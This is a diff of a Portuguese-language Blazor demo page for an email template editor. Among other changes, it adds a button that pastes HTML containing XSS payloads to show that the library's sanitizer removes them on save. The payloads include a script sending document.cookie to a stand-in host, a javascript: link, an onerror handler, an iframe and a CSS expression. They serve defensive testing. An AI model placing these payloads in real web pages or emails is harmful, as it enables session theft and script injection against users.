@@ -1,7 +1,7 @@
 @*
     Demonstração completa do módulo de e-mail: editor (BBiEmail) + persistência
     de templates (IRepositorioTemplateEmail, em memória nesta demo) + envio
-    (IEnviadorEmail simulado, grava .eml). Harness — não faz parte da biblioteca.
+    (transporte simulado, grava .eml). Harness — não faz parte da biblioteca.
 *@
 @page "/email"
 @rendermode InteractiveServer
@@ -14,12 +14,12 @@
 <h1>BBiCore — editor de e-mail</h1>
 
 <p class="intro">
-    Editor completo com <strong>persistência</strong> e <strong>envio</strong>. Salvar grava o
-    template no repositório (aqui em memória); o botão <strong>Enviar teste</strong> aciona o
-    <code>EnviadorEmailSimulado</code>, que grava o e-mail montado como <code>.eml</code> na pasta
-    <code>emails-simulados</code> (raiz do app) — abra no Outlook para conferir corpo, imagens
-    inline e anexos. Em produção, troque o repositório por EF e o enviador por
-    <code>EnviadorEmailExchange</code> no <code>Program.cs</code>, sem mudar o componente.
+    Editor completo. O <strong>acervo</strong> já vem semeado (logo, rodapé, selo, PDF e um anexo de
+    <strong>caminho dinâmico</strong>) — escolha-os nas listas, em vez de subir arquivo.
+    <br />
+    Três regras da biblioteca para observar: um <strong>rascunho não pode ser enviado</strong> pelos
+    sistemas (só o "enviar teste" passa); usar o <strong>PDF como cabeçalho é recusado</strong> (papel
+    de corpo exige imagem); e o HTML é <strong>sanitizado ao salvar</strong> — o botão abaixo mostra isso.
 </p>
 
 <div class="tpl-barra">
@@ -32,17 +32,21 @@
         }
     </select>
     <button type="button" class="tpl-btn" @onclick="Novo">Novo</button>
+    <button type="button" class="tpl-btn tpl-btn--teste" @onclick="ColarHtmlPerigoso">
+        Colar HTML com script (testar sanitização)
+    </button>
     @if (!string.IsNullOrEmpty(_selecionado))
     {
         <button type="button" class="tpl-btn tpl-btn--rem" @onclick="Excluir">Excluir</button>
     }
 </div>
 
-<BBiEmail Template="_template"
+<BBiEmail DestinosDoRascunho="DestinoRascunho.Bytes | DestinoRascunho.Arquivo"
+          Template="_template"
           TipoDados="typeof(PedidoCliente)"
           Motor="_motor"
           DadosExemplo="_exemplo"
-          OnSalvar="Salvar"
+          OnSalvo="Salvar"
           OnEnviado="Enviado" />
 
 @if (_mensagem is not null)
@@ -52,7 +56,7 @@
 
 @code {
     /// <summary>Motor configurado com variáveis do sistema (chave/valor) e os computados padrão.</summary>
-    private readonly MotorTemplateEmail _motor = new(new Dictionary<string, string>
+    private readonly MotorTemplate _motor = new(new Dictionary<string, string>
     {
         ["NomeEmpresa"] = "Banco Exemplo",
         ["TelefoneSac"] = "0800 123 4567",
@@ -87,6 +91,38 @@
     protected override async Task OnInitializedAsync()
         => await RecarregarNomes();
 
+    /// <summary>
+    /// Cola no corpo um HTML que MISTURA conteúdo legítimo com código malicioso. Ao salvar, a
+    /// biblioteca remove só o que executa código — o botão de link, a tabela, a imagem e o estilo
+    /// permanecem — e avisa na tela o que saiu (o log também registra).
+    /// </summary>
+    private void ColarHtmlPerigoso()
+    {
+        _template.OrigemCriacao = OrigemCriacaoTemplate.Avancado;
+
+        _template.Corpo =
+            "<table bgcolor=\"#f6f8fb\" cellpadding=\"12\" style=\"border-collapse:collapse;width:100%\">" +
+            "<tr><td align=\"center\">" +
+            "<h2 style=\"color:#cc092f\">Olá, {{NomeCliente}}!</h2>" +
+            "<p>O seu pedido <b>{{NumeroPedido}}</b> está <b>{{Status}}</b>.</p>" +
+
+            // LEGÍTIMO — este botão de link DEVE sobreviver à sanitização:
+            "<a href=\"https://sistema.interno/pedido/{{NumeroPedido}}\" " +
+            "style=\"background:#cc092f;color:#ffffff;padding:12px 28px;border-radius:4px;display:inline-block\">" +
+            "clique aqui para acessar o Registro</a>" +
+
+            // MALICIOSO — tudo abaixo DEVE ser removido:
+            "<script>fetch('http://malicioso/' + document.cookie)</script>" +
+            "<a href=\"javascript:alert('roubei')\">link que executa código</a>" +
+            "<img src=\"x\" onerror=\"alert('xss')\">" +
+            "<iframe src=\"http://malicioso\"></iframe>" +
+            "<div style=\"width:100%;background:expression(alert(1))\">estilo perigoso</div>" +
+
+            "</td></tr></table>";
+
+        _mensagem = "HTML colado no modo avançado. Salve o rascunho e veja o que a biblioteca remove.";
+    }
+
     /// <summary>Cria um template novo, já com marcadores de exemplo.</summary>
     /// <returns>Template inicial.</returns>
     private static ITemplateEmail NovoTemplate()
@@ -103,7 +139,7 @@
 
     /// <summary>Recarrega os nomes de templates do repositório.</summary>
     private async Task RecarregarNomes()
-        => _nomes = await Repositorio.ListarNomesAsync();
+        => _nomes = await Repositorio.ListarNomesAsync(SituacaoTemplate.Publicado);
 
     /// <summary>Começa um template novo, em branco.</summary>
     private void Novo()
@@ -144,7 +180,7 @@
         await Repositorio.SalvarAsync(template);
         await RecarregarNomes();
         _selecionado = template.Nome;
-        _mensagem = $"Template \"{template.Nome}\" salvo ({template.Anexos.Count} anexo(s)).";
+        _mensagem = $"Template \"{template.Nome}\" salvo.";
     }
 
     /// <summary>Exclui o template selecionado.</summary>
